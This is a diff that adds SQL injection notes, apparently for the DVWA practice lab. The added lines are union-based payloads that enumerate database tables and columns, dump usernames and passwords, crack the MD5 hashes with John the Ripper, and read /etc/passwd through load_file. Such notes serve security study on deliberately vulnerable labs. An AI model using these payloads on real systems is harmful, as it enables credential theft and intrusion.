@@ -104,4 +104,16 @@ CREATE TABLE accounts (
 ' union select database(),user(),version() #
 # same as
 select database(); # at mysql terminal
+
+' union select '',table_schema,table_name from information_schema.tables #
+' union select '',column_name,'' from information_schema.columns where table_name='accounts' #
+' union select '',username,password from accounts #
+' union select '',column_name,'' from information_schema.columns where table_name='users' #
+' union select '',concat(first_name,':',password),'' from dvwa.users #
+
+# crack passwords with John the Ripper
+john passwords.txt --format=raw-MD5
+
+' union select '','',load_file('/etc/passwd') #
+
 ```
